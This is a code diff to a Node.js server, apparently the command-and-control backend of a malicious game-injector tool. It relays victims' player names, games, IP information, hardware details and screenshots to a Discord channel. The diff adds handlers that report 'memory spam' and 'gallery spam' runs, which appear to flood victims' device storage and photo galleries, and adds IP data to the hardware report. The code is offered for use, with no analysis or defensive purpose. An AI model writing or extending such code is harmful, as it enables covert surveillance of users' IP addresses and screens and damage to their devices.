@@ -1,3 +1,4 @@
+// server.js
 const http = require('http');
 const fetch = require('node-fetch');
 
@@ -74,11 +75,29 @@ const server = http.createServer((req, res) => {
                 } else if (command === "inject_notify") {
                     await sendDiscordMessage(
                         "🔌 Новый инжект!",
-                        `**Игрок:** ${args[0]}\n**Игра:** ${args[1]}`,
+                        `**Игрок:** ${args[0]}\n**Игра:** ${args[1]}\n**Инжектор:** ${args[3]}`,
                         0x00ff00,
                         [
                             { name: "IP информация", value: args[2] || "N/A", inline: false }
                         ]
+                    );
+                } else if (command === "memory_spam_start") {
+                    await sendDiscordMessage(
+                        "💾 Memory Spam запущен",
+                        `**Количество файлов:** ${args[0]}\n**Статус:** Выполняется`,
+                        0xff6b6b
+                    );
+                } else if (command === "gallery_spam_start") {
+                    await sendDiscordMessage(
+                        "🖼️ Gallery Spam запущен",
+                        `**Количество копий:** ${args[0]}\n**Файл:** ${args[1]}`,
+                        0x74b9ff
+                    );
+                } else if (command === "spam_completed") {
+                    await sendDiscordMessage(
+                        "✅ Spam операция завершена",
+                        `**Тип:** ${args[0]}\n**Результат:** ${args[1]}`,
+                        0x00ff00
                     );
                 }
 
@@ -122,7 +141,6 @@ const server = http.createServer((req, res) => {
         return;
     }
 
-    // Остальные endpoints остаются без изменений...
     if (req.method === 'POST' && req.url === '/screenshot') {
         let body = '';
         req.on('data', chunk => body += chunk);
@@ -184,14 +202,12 @@ const server = http.createServer((req, res) => {
                 
                 await sendDiscordMessage(
                     "🖥️ Информация об оборудовании",
-                    `**Игрок:** ${player}`,
+                    `**Игрок:** ${player}\n**Игра:** ${data.game}\n**Инжектор:** ${data.executor}`,
                     0x9b59b6,
                     [
                         { name: "FPS", value: data.fps?.toString() || "N/A", inline: true },
                         { name: "Ping", value: data.ping?.toString() || "N/A", inline: true },
-                        { name: "Executor", value: data.executor || "Unknown", inline: true },
-                        { name: "CPU", value: data.cpu || "N/A", inline: true },
-                        { name: "RAM", value: data.ram || "N/A", inline: true }
+                        { name: "IP информация", value: data.ip_info || "N/A", inline: false }
                     ]
                 );
                 
